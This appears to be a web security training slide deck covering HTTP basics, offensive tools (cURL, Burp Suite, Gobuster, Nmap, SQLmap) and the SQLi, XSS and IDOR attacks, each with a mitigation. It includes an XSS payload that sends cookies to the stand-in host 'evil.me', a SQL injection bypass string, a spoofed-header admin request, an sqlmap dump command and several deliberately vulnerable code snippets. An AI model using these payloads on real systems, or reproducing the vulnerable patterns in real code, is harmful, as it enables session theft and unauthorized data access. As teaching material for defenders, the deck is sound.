02 // WEB FOUNDATIONS

What is the Web?

A globally distributed network of servers passing documents and state back and forth across untrusted public routers.

TCP/IP + DNS + HTTP = The structural foundation.
03 // WEB FOUNDATIONS

Client-Server Model

CLIENT (BROWSER) Initiates Connection & Renders DOM
SERVER (API/DB) Processes Logic & Controls State

// Everything that passes between them is vulnerable to modification.

04 // WEB PROTOCOLS

// The HTTP Request

GET /api/v1/users HTTP/1.1
Host: target.me
Authorization: Bearer jwt_token_hash
User-Agent: Mozilla/5.0

The client packs verbs, headers, and bodies into plain-text streams.

05 // WEB PROTOCOLS

// The HTTP Response

HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session_id=secure_entropy_key

{ "status": "authenticated" }

The server evaluates requests and ships back headers, status codes, and data payloads.

06 // WEB STATES

HTTP is Stateless

Every request is independent. To maintain continuity, developers invented cookies, tokens, and storage nodes.

STATE MANAGEMENT = THE LARGEST ATTACK SURFACE
07 // SECURITY SCOPE

The browser is
attacker territory.

You do not control the user's runtime. Every request, cookie, headers configuration, and query string can be falsified.

08 // SECURITY SCOPE

What is Web Security?

The practice of validating, auditing, and enforcing logical isolation boundaries at the server level, assuming the client is actively malicious.

09 // THE LITMUS TEST

Never trust
the client.

This is the single root law of application security. If a validation check happens only in the browser, it does not exist.

// MODULE 02 // OFFENSIVE INSTRUMENTATION

Offensive

Command-line runtimes and proxies used to analyze, map, and exploit web endpoints.

13 // cURL ANALYTICS

cURL: What & Why?

A CLI tool for transferring data with URLs. Security analysts use it to bypass browser UI restrictions, inject custom HTTP headers, and execute raw API tests instantly.

Unbound by browser policies. Direct, scripting-friendly HTTP requests.
14 // cURL SYNTAX

// How to Use: API Header Tampering

curl -X POST https://api.target.me/v1/auth \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -d '{"role": "administrator"}' -v

// The -v flag prints the TLS handshake, headers, and response telemetry.

15 // PROXY INSTRUMENTATION

Burp Suite: What & Why?

An intercepting proxy that handles local traffic between your browser and the destination. It allows engineers to pause, modify, and replay requests.

The industry standard for interactive manual security reviews.
16 // PROXY FLOW

// How to Use: Intercept & Repeater

01 / INTERCEPT Set browser proxy to port 8080, pause request threads, modify raw parameters, and forward.
02 / REPEATER Send an active packet to the Repeater sandbox. Edit parameters iteratively without browser interactions.
17 // RECONNAISSANCE

Gobuster: What & Why?

An active reconnaissance directory brute-forcer. It parses wordlists to locate unlinked endpoints, diagnostic panels, or backup files hidden on a web server.

Rapid subdirectory and subdomain mapping written in Go.
18 // SUBDIRECTORY BRUTEFORCE

// How to Use: Scanning Hidden Assets

gobuster dir -u https://target.me/ -w common_wordlist.txt -x php,json,bak,zip -t 50

Runs 50 parallel threads (-t 50) mapping common filenames alongside designated extensions (-x).

19 // SERVICE AUDITING

Nmap: What & Why?

A network exploration and port auditing scanner. It determines what ports are open, which web servers are running, and what operating systems host your targets.

Locates exposed infrastructure services like database endpoints and SSH channels.
20 // PORT ANALYSIS

// How to Use: Web Server Audit

nmap -sV -sC -p 80,443,8080,3306 target.me

Examines software versions (-sV) and triggers default scanning scripts (-sC) to identify known software flaws.

21 // EXPLOITATION AUTOMATION

SQLmap: What & Why?

An automated database injection engine. It automatically identifies injection points, extracts database structures, and dumps credentials without manual script writing.

Automates SQLi detection from simple error pages to complex blind delays.
22 // DATABASE DUMPING

// How to Use: Extracting Database Schema

sqlmap -u "https://target.me/api/users?id=1" --dbms=mysql --dbs --batch

Targets a specific database management system (--dbms) and extracts schema footprints while running on autopilot (--batch).

23 // CORE ATTACKS

Attack #1: SQL Injection (SQLi)

Occurs when user data parameters escape variable isolation and execute directly inside database queries.

OWASP TOP 10 // CORE INJECTION
24 // SQLi DETAILS

// Vulnerable Code Pattern

const sql = `SELECT * FROM users WHERE email = '${user_input}'`;

// Dynamic string concatenation blends script context and user input.

25 // SQLi DETAILS

// Exploit Input

admin@domain.com' OR '1'='1
SELECT * FROM users WHERE email = 'admin@domain.com' OR '1'='1'
26 // SQLi MITIGATION

// Secure Parameterized Pattern

const sql = 'SELECT * FROM users WHERE email = ?';
const [rows] = await db.execute(sql, [user_input]);

Forces variables to execute strictly as simple text literals.

27 // CORE ATTACKS

Attack #2: Cross-Site Scripting (XSS)

Happens when untrusted user payload constructs execute inside a third-party client's browser DOM scope.

STOLEN SESSIONS // MALICIOUS DOM OVERLAYS
28 // XSS DETAILS

// Vulnerable HTML Node

<div> Search Results: ${query_param} </div>

Direct variable injection without output encoding triggers script execution.

29 // XSS DETAILS

// Exploit Input

<img src="x" onerror="fetch('https://evil.me/steal?cookie=' + document.cookie)">

Allows attackers to capture raw session context tokens instantly.

30 // XSS MITIGATION

// Contextual Entity Encoding

&lt;img src=&quot;x&quot; onerror=&quot;...&quot;&gt;

Escapes execution parameters safely into standard plain text display layouts.

31 // CORE ATTACKS

Attack #3: IDOR

Insecure Direct Object References: Querying system resources by direct indexes without verified access checks.

OWASP TOP 10 // BROKEN ACCESS CONTROL
32 // IDOR DETAILS

// Vulnerable API Endpoint

app.get('/api/accounts/:id', async (req, res) => {
  const profile = await db.findAccount(req.params.id);
  res.json(profile);
});
33 // IDOR DETAILS

// Attack Vectors

YOUR PROFILE ID /api/accounts/103
TARGET ATTACK OBJECT /api/accounts/101

Exposes raw accounts directly by manual integer tampering.

34 // IDOR MITIGATION

// Secure Context Verification

if (req.user.id !== req.params.id) {
  return res.status(403).json({ error: 'Access Denied' });
}

Always validate resource requests against current authenticated session IDs.
